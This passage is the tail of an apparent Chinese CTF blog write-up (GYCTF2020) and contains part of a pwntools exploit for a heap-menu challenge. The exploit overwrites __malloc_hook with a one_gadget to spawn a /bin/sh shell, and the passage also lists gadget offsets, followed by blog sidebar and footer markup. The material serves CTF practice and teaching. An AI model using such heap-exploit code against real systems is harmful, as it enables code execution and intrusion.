&quot;)</span><br><span class="line">	p.sendline(str(size_1))</span><br><span class="line">	p.recvuntil(&quot;O : &quot;)</span><br><span class="line">	p.sendline(content_1)</span><br><span class="line">	p.recvuntil(&quot;RE&#39;s length : &quot;)</span><br><span class="line">	p.sendline(str(size_2))</span><br><span class="line">	p.recvuntil(&quot;RE : &quot;)</span><br><span class="line">	p.sendline(content_2)</span><br><span class="line">def edit(index,content_1&#x3D;&#39;&#39;,content_2&#x3D;&#39;&#39;):</span><br><span class="line">	p.recvuntil(&#39;to do :&#39;)</span><br><span class="line">	p.sendline(&#39;2&#39;)</span><br><span class="line">	p.recvuntil(&#39;Oreo ID : &#39;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">	p.recvuntil(&quot;O : &quot;)</span><br><span class="line">	p.sendline(content_1)</span><br><span class="line">	p.recvuntil(&quot;RE : &quot;)</span><br><span class="line">	p.sendline(content_2)</span><br><span class="line">def free(index):</span><br><span class="line">	p.recvuntil(&#39;to do :&#39;)</span><br><span class="line">	p.sendline(&#39;3&#39;)</span><br><span class="line">	p.recvuntil(&#39;Oreo ID : &#39;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line">def show(index):</span><br><span class="line">	p.recvuntil(&#39;to do :&#39;)</span><br><span class="line">	p.sendline(&#39;4&#39;)</span><br><span class="line">	p.recvuntil(&#39;Oreo ID : &#39;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">base&#x3D;leak()</span><br><span class="line">malloc_hook&#x3D;base+0x3c4b10</span><br><span class="line">one_gadget&#x3D;base+0x4526a</span><br><span class="line">realloc&#x3D;base+0x846c0</span><br><span class="line">add(0x68,0x68,&#39;aa&#39;,&#39;aa&#39;)</span><br><span class="line">free(1)</span><br><span class="line">#O-&gt;RE RE last</span><br><span class="line"></span><br><span class="line">edit(1,&#39;\x00&#39;*8,p64(malloc_hook-0x23))</span><br><span class="line">#O be RE,RE be malloc_hook-0x23</span><br><span class="line">payload&#x3D;&#39;a&#39;*(0x13-0x8)+p64(one_gadget)+p64(realloc+0xb)</span><br><span class="line">add(0x68,0x68,&#39;a&#39;*8,payload)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">p.recvuntil(&#39;to do :&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recvuntil(&quot;O&#39;s length : &quot;)</span><br><span class="line">p.sendline(&#39;20&#39;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">0x45216	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0x4526a	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0xf02a4  	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">0xf1147 	execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] &#x3D;&#x3D; NULL</span><br><span class="line"></span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>好饿啊，早知道不学安全了</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="1p0ch 微信支付">
+        <p>微信支付</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag"># 复现</a>
+              <a href="/tags/GYCTF2020/" rel="tag"># GYCTF2020</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/12/WUSTCTF%E5%A4%8D%E7%8E%B0/" rel="prev" title="WUSTCTF2020复现">
+      <i class="fa fa-chevron-left"></i> WUSTCTF2020复现
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#gyctf-2020-some-thing-exceting"><span class="nav-number">1.</span> <span class="nav-text">gyctf_2020_some_thing_exceting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gyctf-2020-borrowstack"><span class="nav-number">2.</span> <span class="nav-text">gyctf_2020_borrowstack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gyctf-2020-force"><span class="nav-number">3.</span> <span class="nav-text">gyctf_2020_force</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gyctf-2020-signin"><span class="nav-number">4.</span> <span class="nav-text">gyctf_2020_signin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gyctf-2020-some-thing-interesting"><span class="nav-number">5.</span> <span class="nav-text">gyctf_2020_some_thing_interesting</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="1p0ch"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">1p0ch</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/1p0ch" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;1p0ch" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/mayedoushidalao@163.com" title="E-Mail → mayedoushidalao@163.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=765986760&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;765986760&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fa fa-fw fa-qq"></i>QQ</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">浙ICP备20005978号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1p0ch</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">46k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">42 分钟</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
